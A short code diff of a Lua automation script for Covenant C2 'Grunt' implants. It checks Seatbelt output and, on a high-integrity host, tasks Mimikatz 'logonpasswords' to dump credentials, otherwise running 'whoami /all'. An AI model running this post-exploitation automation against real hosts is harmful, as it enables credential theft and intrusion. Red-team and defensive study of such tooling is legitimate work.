@@ -9,12 +9,12 @@ function OnGruntInitial(n)
 	print('[LUA] Checking Seatbelt Output:')
 	if string.match(response, "HighIntegrity                 :  True") then
 		print ('Returned Grunt is High Integrity.')
-		print ('Tasking Rubeus to Grunt.')
+		print ('Tasking Mimikatz LogonPasswords to Grunt.')
 		response = (GruntExec(n,'logonpasswords'))
 		print (response)
 	else
 		print ('Returned Grunt is Medium Integrity')
-		print (GruntExec(n,'shellcmd net localgroup'))
+		print (GruntExec(n,'shellcmd whoami /all'))
 	end	
 end
 
